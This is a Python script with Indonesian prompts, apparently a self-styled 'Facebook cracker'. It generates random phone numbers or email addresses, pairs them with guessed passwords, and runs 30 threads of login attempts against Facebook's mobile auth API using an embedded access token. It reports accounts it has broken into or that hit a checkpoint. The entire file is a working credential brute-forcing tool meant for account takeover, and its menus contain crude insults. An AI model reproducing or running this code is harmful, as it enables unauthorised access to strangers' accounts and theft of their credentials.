#Coded By Rizky Maulana Sidik

import os, re, requests, concurrent.futures
from random import randint

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('  [SUKSES] %s 👉❤👈 %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('  [CP] %s 👉💔👈 %s '%(str(user), str(pw)))
        break
  except: pass

def random_numbers():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  ♠️♦️👿FACEBOOK CRACKER RANDOM NUMBERS👿♦️♠️

  Isi Nomer Awal Nya Dulu Bro
  Harus 5 digit gak boleh kurang dan gak boleh lebih.
  Contoh: 62821
  ''')
  kode=str(input('  Masukan nomor awal: '))
  exit('  Nomor harus 5 digit ya bro ga boleh kurang.') if len(kode) < 5 else ''
  exit('  Nomor harus 5 digit ya bro ga boleh lebih.') if len(kode) > 5 else ''
  jml=int(input('''
  Masukan jumlah nomor yang akan dibuat contoh: 10
  Jumlah: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
  print('''
  Semoga Hari Ini Loe Beruntung Bro1🙏🏽👈♥️
  Tunggu Bentar Lagi Crottttt Ahhhhh.....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def random_email():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  ♣️❤👺 FACEBOOK CRACKER RANDOM EMAIL👺♥️♣️

  Isi Nama Pengguna Nya Dulu Bro
  Contoh: RizkyGamtenk
  ''')
  nama=input('  Nama pengguna: ')
  domain=input('''
  Pilih domainya kak [G]mail, [Y]ahoo, [H]otmail
  pilih (g,y,h): ''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  Mohon isi yang bener ya kak.') if not domain in ['g','y','h'] else ''
  jml=int(input('''
  Masukan jumlah email yang akan dibuat contoh: 10
  Jumlah: '''))
  setpw=input('''
  Set password yg mendekati nama pengguna
  contoh: kaka123,kaka1234
  Set password: ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  print('''
  Semoga Hari Ini Loe Beruntung Sob🙏🏽👈
  Tunggu Bro Dikit Lagi Mulai Crot.....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def pilih():
  print('''
♣️❤👉 1. Crack Dari Nomer Random 👈♥️♣️
👿♣️👉  2. Crack Dari Email Random 👈♣️👿
  ''')
  pil=int(input('  Pilih Yang Mana Bro?: '))
  if pil == 1:
    random_numbers()
  elif pil == 2:
    random_email()
  else:
    exit('  Goblokk')
 
pilih() if __name__ == '__main__' else exit('Maaf ada yang error bro , silahkan coba lagi yahh.')
